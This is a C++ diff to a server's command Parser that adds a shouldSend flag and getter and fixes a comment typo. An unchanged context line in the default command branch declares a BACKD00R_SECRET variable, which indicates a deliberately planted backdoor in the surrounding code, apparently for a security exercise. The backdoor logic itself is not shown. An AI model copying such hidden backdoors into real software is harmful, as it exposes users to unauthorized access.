@@ -48,6 +48,7 @@ Parser::Parser(map<string, string> allowedUsers){
     srand(time(nullptr));
     this->allowedUsers = allowedUsers;
     shouldPrint = true;
+    shouldSend = true;
     initialize();
 }
 
@@ -233,7 +234,9 @@ void Parser::executeCommand(User &usr){
             break;
         }
         case exit_: {
-            exit_cmd(usr);
+            if(exit_cmd(usr) == 0){
+                shouldSend = false;
+            }
         }
         default: {
             string BACKD00R_SECRET;
@@ -275,15 +278,25 @@ void Parser::resetCommand(){
     output = "";
     tokens.clear();
     shouldPrint = true;
+    shouldSend = true;
 }
 
 /**
  * Getter for shouldPrint member.
  *
- * @return boolean, True if server should brint output.
+ * @return boolean, True if server should print output.
  */
 bool Parser::getShouldPrint(){
     return shouldPrint;
+}
+
+/**
+ * Getter for shouldSend member.
+ *
+ * @return boolean, True if server should send the output to the client.
+ */
+bool Parser::getShouldSend(){
+    return shouldSend;
 }
 
 /**
